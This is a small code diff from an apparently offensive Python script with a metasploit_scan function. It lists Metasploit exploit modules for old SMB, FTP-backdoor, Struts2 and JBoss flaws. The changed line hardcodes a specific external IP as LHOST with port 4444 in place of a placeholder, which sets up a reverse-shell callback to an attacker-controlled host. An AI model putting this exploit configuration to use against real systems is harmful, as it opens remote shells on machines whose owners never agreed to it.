@@ -511,7 +511,7 @@ def metasploit_scan():
                 "33": "exploit/windows/smb/ms08_067_netapi",  
                 "44": "exploit/unix/ftp/vsftpd_234_backdoor",  
                 "55": "exploit/multi/http/struts2_code_exec",  
-                "66": "exploit/multi/http/jboss_deployment_scanner set LHOST {ip} LPORT 4444 run"  
+                "66": "exploit/multi/http/jboss_deployment_scanner set LHOST 203.211.74.76 LPORT 4444 run"  
       
               }  
               
